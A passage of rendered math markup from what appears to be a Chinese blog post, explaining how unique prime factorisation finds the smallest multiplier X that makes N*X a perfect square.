xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>K</mi><mn>2</mn></msup><mo>=</mo><msubsup><mi>s</mi><mn>1</mn><mn>2</mn></msubsup><mo>∗</mo><msubsup><mi>s</mi><mn>2</mn><mn>2</mn></msubsup><mo>∗</mo><msubsup><mi>s</mi><mn>3</mn><mn>2</mn></msubsup><mo>∗</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∗</mo><msubsup><mi>s</mi><mi>r</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">K^2 = s^2_{1}*s^2_{2}*s^2_{3}*...*s^2_{r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></p><p>根据<code>唯一分解定理</code>得:若有素数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>p</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>p</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">p_1,p_2,p_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>p</mi><mn>2</mn></msub><mo>=</mo><msubsup><mi>p</mi><mn>3</mn><mn>2</mn></msubsup><mo stretchy="false">(</mo><mo>=</mo><mi>Q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_1 * p_2 = p^2_3(=Q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">Q</span><span class="mclose">)</span></span></span></span>,则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>=</mo><msub><mi>p</mi><mn>2</mn></msub><mo>=</mo><msub><mi>p</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">p_1=p_2=p_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,即对Q的分解是唯一的.</p><p>因此有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>s</mi><mi>i</mi><mn>2</mn></msubsup><mo>=</mo><msup><mi>a</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">s^2_i = a^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.072772em;vertical-align:-0.258664em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>,其中$a \in {p_i} \cup {q_i} $.</p><p>(博客公式处理有问题,下面放个截图吧……)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240116115407625.png" alt="image-20240116115407625" style="zoom:33%;" /><p>所以,对于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>∗</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">N*X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>的所有质因数而言:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>∗</mo><mi>X</mi><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msubsup><mo>⋅</mo><msubsup><mi>p</mi><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub></msubsup><mo>⋅</mo><mo>…</mo><mo>⋅</mo><msubsup><mi>p</mi><mi>k</mi><msub><mi>a</mi><mi>k</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">N*X = p_1^{a_1} \cdot p_2^{a_2} \cdot \ldots \cdot p_k^{a_k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0533599999999999em;vertical-align:-0.30130799999999996em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7520519999999999em;"><span style="top:-2.398692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1506600000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30130799999999996em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>该式中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">a^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.824664em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span>必然为偶数,但是由于:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msubsup><mo>⋅</mo><msubsup><mi>p</mi><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub></msubsup><mo>⋅</mo><mo>…</mo><mo>⋅</mo><msubsup><mi>p</mi><mi>k</mi><msub><mi>a</mi><mi>k</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">N = p_1^{a_1} \cdot p_2^{a_2} \cdot \ldots \cdot p_k^{a_k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0533599999999999em;vertical-align:-0.30130799999999996em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7520519999999999em;"><span style="top:-2.398692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1506600000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30130799999999996em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>该式中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">a^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.824664em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span>不一定为偶数.(注意上面2式中同名变量无关)</p><p>因此,对于X的质因数分解,只需要保证能够和N的质因数分解&quot;互补&quot;,即乘积的幂为偶数即可.</p><p>换句话说,为了求解X,初始令X=1,如果N的分解中某一个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mi>i</mi><msup><mi>a</mi><mi>i</mi></msup></msubsup></mrow><annotation encoding="application/x-tex">p^{a^i}_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.253124em;vertical-align:-0.258664em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9944599999999999em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9020857142857143em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">a^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.824664em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span>为奇数,则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>∗</mo><mo>=</mo><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">X*=p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord">∗</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span 